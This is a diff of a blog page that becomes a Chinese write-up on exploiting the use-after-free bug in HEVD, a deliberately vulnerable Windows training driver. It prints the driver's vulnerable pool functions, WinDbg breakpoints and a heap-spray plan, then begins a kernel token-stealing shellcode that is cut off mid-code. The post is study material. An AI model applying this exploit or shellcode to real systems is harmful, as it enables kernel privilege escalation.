@@ -6,15 +6,28 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Archives | 021w</title>
+  <title>HEVD内核漏洞学习(2)-UAF | 021w</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="021w">
-<meta property="og:url" content="http://yoursite.com/archives/index.html">
+  <meta name="description" content="0x00前言这是Windows kernel exploit系列的第二部分 先从UAF开始 因为之前有过pwn的经验 所以堆UAF的原理也是清楚 所以我也就直接从漏洞开始了">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HEVD内核漏洞学习(2)-UAF">
+<meta property="og:url" content="http://yoursite.com/2020/10/22/HEVD%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-2-UAF/index.html">
 <meta property="og:site_name" content="021w">
+<meta property="og:description" content="0x00前言这是Windows kernel exploit系列的第二部分 先从UAF开始 因为之前有过pwn的经验 所以堆UAF的原理也是清楚 所以我也就直接从漏洞开始了">
 <meta property="og:locale">
+<meta property="og:image" content="http://yoursite.com/2020/10/22/HEVD%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-2-UAF/3.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/22/HEVD%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-2-UAF/4.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/22/HEVD%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-2-UAF/5.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/22/HEVD%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-2-UAF/6.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/22/HEVD%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-2-UAF/1.png">
+<meta property="og:image" content="http://yoursite.com/2020/10/22/HEVD%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-2-UAF/2.gif">
+<meta property="og:image" content="http://yoursite.com/2020/10/22/HEVD%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-2-UAF/7.png">
+<meta property="article:published_time" content="2020-10-22T13:52:09.000Z">
+<meta property="article:modified_time" content="2020-10-25T10:01:11.514Z">
 <meta property="article:author" content="021w">
+<meta property="article:tag" content="HEVD内核">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/10/22/HEVD%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-2-UAF/3.png">
   
     <link rel="alternative" href="/atom.xml" title="021w" type="application/atom+xml">
   
@@ -124,188 +137,62 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-HEVD内核漏洞学习-2-UAF" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2020" class="archive-year">2020</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/10/25/HEVD%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-6-%E7%A9%BA%E6%8C%87%E9%92%88%E8%A7%A3%E5%BC%95%E7%94%A8/" class="archive-article-date">
-  	<time datetime="2020-10-25T08:08:15.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-25</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/10/25/HEVD%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-6-%E7%A9%BA%E6%8C%87%E9%92%88%E8%A7%A3%E5%BC%95%E7%94%A8/">HEVD内核漏洞学习(6)空指针解引用</a>
+    <h1 class="article-title" itemprop="name">
+      HEVD内核漏洞学习(2)-UAF
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">HEVD内核</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/10/24/HEVD%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-5-%E6%B1%A0%E6%BA%A2%E5%87%BA/" class="archive-article-date">
-  	<time datetime="2020-10-24T08:56:50.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-24</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/10/24/HEVD%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-5-%E6%B1%A0%E6%BA%A2%E5%87%BA/">HEVD内核漏洞学习(5)池溢出</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">HEVD内核</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/10/23/HEVD%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-4-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/" class="archive-article-date">
-  	<time datetime="2020-10-23T15:12:47.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-23</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/10/23/HEVD%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-4-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/">HEVD内核漏洞学习(4)-整数溢出</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">HEVD内核</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/10/23/HEVD%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-3-%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86/" class="archive-article-date">
-  	<time datetime="2020-10-23T07:23:14.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-23</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/10/23/HEVD%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-3-%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86/">HEVD内核漏洞学习-3-类型混淆</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">HEVD内核</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/10/22/HEVD%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-2-UAF/" class="archive-article-date">
+        
+        <a href="/2020/10/22/HEVD%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-2-UAF/" class="archive-article-date">
   	<time datetime="2020-10-22T13:52:09.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-22</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/10/22/HEVD%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-2-UAF/">HEVD内核漏洞学习(2)-UAF</a>
-    </h1>
-  
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h1><p>这是Windows kernel exploit系列的第二部分 先从UAF开始 因为之前有过pwn的经验 所以堆UAF的原理也是清楚 所以我也就直接从漏洞开始了</p>
+<a id="more"></a>
+<h1 id="0x01漏洞原理"><a href="#0x01漏洞原理" class="headerlink" title="0x01漏洞原理"></a>0x01漏洞原理</h1><h2 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h2><p>其实UAF跟其名字一样 释放后重利用 在内存块释放之后 其对应的指针没有被设置为NULL 但是在下次使用之前 有代码堆这块内存进行了修改 比如将内存指针修改为dangling pointer 从而执行我们的shellcode </p>
+<h2 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h2><p>我们来分析几个对堆块操作的函数</p>
+<p>首先这个函数是分配一个非分页的池块（内存中的池分配机制是按块来的 假如每个块的大小是64bytes 需要分配70bytes的内存 就会分配两个块 虽然比较浪费内存 但速度快）并用’A’填充 并将池块编辑为”Hack”（在调试的时候方便识别）</p>
+<p><strong>AllocateUaFObject</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS AllocateUaFObjectNonPagedPool(VOID)&#123;</span><br><span class="line">    NTSTATUS Status &#x3D; STATUS_UNSUCCESSFUL;</span><br><span class="line">    PUSE_AFTER_FREE_NON_PAGED_POOL UseAfterFree &#x3D; NULL;</span><br><span class="line">    PAGED_CODE();</span><br><span class="line"> </span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">        DbgPrint(&quot;[+] Allocating UaF Object\n&quot;);</span><br><span class="line"> </span><br><span class="line">        &#x2F;&#x2F; Allocate Pool chunk</span><br><span class="line">        UseAfterFree &#x3D; (PUSE_AFTER_FREE_NON_PAGED_POOL)ExAllocatePoolWithTag(</span><br><span class="line">            NonPagedPool,</span><br><span class="line">            sizeof(USE_AFTER_FREE_NON_PAGED_POOL),</span><br><span class="line">            (ULONG)POOL_TAG</span><br><span class="line">        );</span><br><span class="line"> </span><br><span class="line">        if (!UseAfterFree)</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F; Unable to allocate Pool chunk</span><br><span class="line">            DbgPrint(&quot;[-] Unable to allocate Pool chunk\n&quot;);</span><br><span class="line"> </span><br><span class="line">            Status &#x3D; STATUS_NO_MEMORY;</span><br><span class="line">            return Status;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            DbgPrint(&quot;[+] Pool Tag: %s\n&quot;, STRINGIFY(POOL_TAG));</span><br><span class="line">            DbgPrint(&quot;[+] Pool Type: %s\n&quot;, STRINGIFY(NonPagedPool));</span><br><span class="line">            DbgPrint(&quot;[+] Pool Size: 0x%X\n&quot;, sizeof(USE_AFTER_FREE_NON_PAGED_POOL));</span><br><span class="line">            DbgPrint(&quot;[+] Pool Chunk: 0x%p\n&quot;, UseAfterFree);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        &#x2F;&#x2F; Fill the buffer with ASCII &#39;A&#39;</span><br><span class="line">        RtlFillMemory((PVOID)UseAfterFree-&gt;Buffer, sizeof(UseAfterFree-&gt;Buffer), 0x41);</span><br><span class="line"> </span><br><span class="line">        &#x2F;&#x2F; Null terminate the char buffer</span><br><span class="line">        UseAfterFree-&gt;Buffer[sizeof(UseAfterFree-&gt;Buffer) - 1] &#x3D; &#39;\0&#39;;</span><br><span class="line"> </span><br><span class="line">        &#x2F;&#x2F; Set the object Callback function</span><br><span class="line">        UseAfterFree-&gt;Callback &#x3D; &amp;UaFObjectCallbackNonPagedPool;</span><br><span class="line"> </span><br><span class="line">        &#x2F;&#x2F; Assign the address of UseAfterFree to a global variable</span><br><span class="line">        g_UseAfterFreeObjectNonPagedPool &#x3D; UseAfterFree;</span><br><span class="line"> </span><br><span class="line">        DbgPrint(&quot;[+] UseAfterFree Object: 0x%p\n&quot;, UseAfterFree);</span><br><span class="line">        DbgPrint(&quot;[+] g_UseAfterFreeObjectNonPagedPool: 0x%p\n&quot;, g_UseAfterFreeObjectNonPagedPool);</span><br><span class="line">        DbgPrint(&quot;[+] UseAfterFree-&gt;Callback: 0x%p\n&quot;, UseAfterFree-&gt;Callback);</span><br><span class="line">    &#125;</span><br><span class="line">    __except (EXCEPTION_EXECUTE_HANDLER)</span><br><span class="line">    &#123;</span><br><span class="line">        Status &#x3D; GetExceptionCode();</span><br><span class="line">        DbgPrint(&quot;[-] Exception Code: 0x%X\n&quot;, Status);</span><br><span class="line">    &#125;</span><br><span class="line">    return Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>FreeUaFObject</strong><br>这个函数是用来释放池块 图中是安全版本 所以将g_UseAfterFreeObjectNonPagedPool = NULL 而漏洞驱动中 未将此置为NULL</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">FreeUaFObjectNonPagedPool(</span><br><span class="line">    VOID</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">    NTSTATUS Status &#x3D; STATUS_UNSUCCESSFUL;</span><br><span class="line"></span><br><span class="line">    PAGED_CODE();</span><br><span class="line"></span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">        if (g_UseAfterFreeObjectNonPagedPool)</span><br><span class="line">        &#123;</span><br><span class="line">            DbgPrint(&quot;[+] Freeing UaF Object\n&quot;);</span><br><span class="line">            DbgPrint(&quot;[+] Pool Tag: %s\n&quot;, STRINGIFY(POOL_TAG));</span><br><span class="line">            DbgPrint(&quot;[+] Pool Chunk: 0x%p\n&quot;, g_UseAfterFreeObjectNonPagedPool);</span><br><span class="line"></span><br><span class="line">#ifdef SECURE</span><br><span class="line">            &#x2F;&#x2F;</span><br><span class="line">            &#x2F;&#x2F; Secure Note: This is secure because the developer is setting</span><br><span class="line">            &#x2F;&#x2F; &#39;g_UseAfterFreeObjectNonPagedPool&#39; to NULL once the Pool chunk is being freed</span><br><span class="line">            &#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">            ExFreePoolWithTag((PVOID)g_UseAfterFreeObjectNonPagedPool, (ULONG)POOL_TAG);</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F;</span><br><span class="line">            &#x2F;&#x2F; Set to NULL to avoid dangling pointer</span><br><span class="line">            &#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">            g_UseAfterFreeObjectNonPagedPool &#x3D; NULL; &#x2F;&#x2F;漏洞版本未置NULL</span><br><span class="line">#else</span><br><span class="line">            &#x2F;&#x2F;</span><br><span class="line">            &#x2F;&#x2F; Vulnerability Note: This is a vanilla Use After Free vulnerability</span><br><span class="line">            &#x2F;&#x2F; because the developer is not setting &#39;g_UseAfterFreeObjectNonPagedPool&#39; to NULL.</span><br><span class="line">            &#x2F;&#x2F; Hence, g_UseAfterFreeObjectNonPagedPool still holds the reference to stale pointer</span><br><span class="line">            &#x2F;&#x2F; (dangling pointer)</span><br><span class="line">            &#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">            ExFreePoolWithTag((PVOID)g_UseAfterFreeObjectNonPagedPool, (ULONG)POOL_TAG);</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">            Status &#x3D; STATUS_SUCCESS;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    __except (EXCEPTION_EXECUTE_HANDLER)</span><br><span class="line">    &#123;</span><br><span class="line">        Status &#x3D; GetExceptionCode();</span><br><span class="line">        DbgPrint(&quot;[-] Exception Code: 0x%X\n&quot;, Status);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>UseUaFObject</strong><br>其实函数名已经很明显了 就是使用UAF对象 即就是使用刚才的g_UseAfterFreeObject</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS UseUaFObjectNonPagedPool(VOID)&#123;</span><br><span class="line">    NTSTATUS Status &#x3D; STATUS_UNSUCCESSFUL;</span><br><span class="line">    PAGED_CODE();</span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">        if (g_UseAfterFreeObjectNonPagedPool)</span><br><span class="line">        &#123;</span><br><span class="line">            DbgPrint(&quot;[+] Using UaF Object\n&quot;);</span><br><span class="line">            DbgPrint(&quot;[+] g_UseAfterFreeObjectNonPagedPool: 0x%p\n&quot;, g_UseAfterFreeObjectNonPagedPool);</span><br><span class="line">            DbgPrint(&quot;[+] g_UseAfterFreeObjectNonPagedPool-&gt;Callback: 0x%p\n&quot;, g_UseAfterFreeObjectNonPagedPool-&gt;Callback);</span><br><span class="line">            DbgPrint(&quot;[+] Calling Callback\n&quot;);</span><br><span class="line"> </span><br><span class="line">            if (g_UseAfterFreeObjectNonPagedPool-&gt;Callback)</span><br><span class="line">            &#123;</span><br><span class="line">                g_UseAfterFreeObjectNonPagedPool-&gt;Callback();</span><br><span class="line">            &#125;</span><br><span class="line">            Status &#x3D; STATUS_SUCCESS;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    __except (EXCEPTION_EXECUTE_HANDLER)</span><br><span class="line">    &#123;</span><br><span class="line">        Status &#x3D; GetExceptionCode();</span><br><span class="line">        DbgPrint(&quot;[-] Exception Code: 0x%X\n&quot;, Status);</span><br><span class="line">    &#125;</span><br><span class="line">    return Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>AllocateFakeObject</strong><br>该函数分配fake对象 将对象分配到UAF对象所在的位置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS</span><br><span class="line">AllocateFakeObjectNonPagedPool( _In_ PFAKE_OBJECT_NON_PAGED_POOL UserFakeObject)&#123;</span><br><span class="line">    NTSTATUS Status &#x3D; STATUS_SUCCESS;</span><br><span class="line">    PFAKE_OBJECT_NON_PAGED_POOL KernelFakeObject &#x3D; NULL;</span><br><span class="line">    PAGED_CODE();</span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">        DbgPrint(&quot;[+] Creating Fake Object\n&quot;);</span><br><span class="line"> </span><br><span class="line">        &#x2F;&#x2F; Allocate Pool chunk</span><br><span class="line">        KernelFakeObject &#x3D; (PFAKE_OBJECT_NON_PAGED_POOL)ExAllocatePoolWithTag(</span><br><span class="line">            NonPagedPool,</span><br><span class="line">            sizeof(FAKE_OBJECT_NON_PAGED_POOL),</span><br><span class="line">            (ULONG)POOL_TAG</span><br><span class="line">        );</span><br><span class="line"> </span><br><span class="line">        if (!KernelFakeObject)</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F; Unable to allocate Pool chunk</span><br><span class="line">            DbgPrint(&quot;[-] Unable to allocate Pool chunk\n&quot;);</span><br><span class="line">            Status &#x3D; STATUS_NO_MEMORY;</span><br><span class="line">            return Status;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            DbgPrint(&quot;[+] Pool Tag: %s\n&quot;, STRINGIFY(POOL_TAG));</span><br><span class="line">            DbgPrint(&quot;[+] Pool Type: %s\n&quot;, STRINGIFY(NonPagedPool));</span><br><span class="line">            DbgPrint(&quot;[+] Pool Size: 0x%X\n&quot;, sizeof(FAKE_OBJECT_NON_PAGED_POOL));</span><br><span class="line">            DbgPrint(&quot;[+] Pool Chunk: 0x%p\n&quot;, KernelFakeObject);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        &#x2F;&#x2F; Verify if the buffer resides in user mode</span><br><span class="line">        ProbeForRead(</span><br><span class="line">            (PVOID)UserFakeObject,</span><br><span class="line">            sizeof(FAKE_OBJECT_NON_PAGED_POOL),</span><br><span class="line">            (ULONG)__alignof(UCHAR)</span><br><span class="line">        );</span><br><span class="line"> </span><br><span class="line">        &#x2F;&#x2F; Copy the Fake structure to Pool chunk</span><br><span class="line">        RtlCopyMemory(</span><br><span class="line">            (PVOID)KernelFakeObject,</span><br><span class="line">            (PVOID)UserFakeObject,</span><br><span class="line">            sizeof(FAKE_OBJECT_NON_PAGED_POOL)</span><br><span class="line">        );</span><br><span class="line"> </span><br><span class="line">        &#x2F;&#x2F; Null terminate the char buffer</span><br><span class="line">        KernelFakeObject-&gt;Buffer[sizeof(KernelFakeObject-&gt;Buffer) - 1] &#x3D; &#39;\0&#39;;</span><br><span class="line"> </span><br><span class="line">        DbgPrint(&quot;[+] Fake Object: 0x%p\n&quot;, KernelFakeObject);</span><br><span class="line">    &#125;</span><br><span class="line">    __except (EXCEPTION_EXECUTE_HANDLER)</span><br><span class="line">    &#123;</span><br><span class="line">        Status &#x3D; GetExceptionCode();</span><br><span class="line">        DbgPrint(&quot;[-] Exception Code: 0x%X\n&quot;, Status);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    return Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><p>我们对上面的函数分别下断点 来观察利用过程</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bp HEVD!AllocateUaFObjectNonPagedPool</span><br><span class="line">bp HEVD!FreeUaFObjectNonPagedPool</span><br><span class="line">bp HEVD!AllocateFakeObjectNonPagedPool</span><br><span class="line">bp HEVD!UseUaFObjectNonPagedPool</span><br></pre></td></tr></table></figure>
+<p>然后执行exp WinDbg断下 然后单步执行到这里查看池的状态 已经被’A’占用<br><img src="3.png"><br>再次g 运行到第二个断点 单步执行到这里再次查看池的状态 我们的”HACK”已经是Free了 但没有置为NULL<br><img src="4.png"><br>再次g 运行到第三个断点处 将对象分配到UAF对象所在的位置<br><img src="5.png"><br>再次g 此时已经完成堆喷射 执行回调函数 我们再次观察池 可见callbake地址被覆盖为shellcode的地址 自此 我们就完成了利用<br><img src="6.png"></p>
+<h1 id="0x03漏洞利用"><a href="#0x03漏洞利用" class="headerlink" title="0x03漏洞利用"></a>0x03漏洞利用</h1><p>我们就根据上面的流程来利用编写exp 我们只要将自己申请的池块大小跟内核中池块大小相同 就有可能会利用它 只伪造一块的话肯定是不够的 我们可以通过在0day2上面学到的“堆喷射”技术 多伪造一些堆块来增加概率 然后释放的时候指向我们的shellcode即可利用漏洞</p>
+<h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">void ShellCode()</span><br><span class="line">&#123;</span><br><span class="line">    _asm</span><br><span class="line">    &#123;</span><br><span class="line">        nop</span><br><span class="line">        nop</span><br><span class="line">        nop</span><br><span class="line">        nop</span><br><span class="line">        pushad</span><br><span class="line">        mov eax,fs:[124h]        &#x2F;&#x2F; 找到当前线程的_KTHREAD结构</span><br><span class="line">        mov eax, [eax + 0x50]    &#x2F;&#x2F; 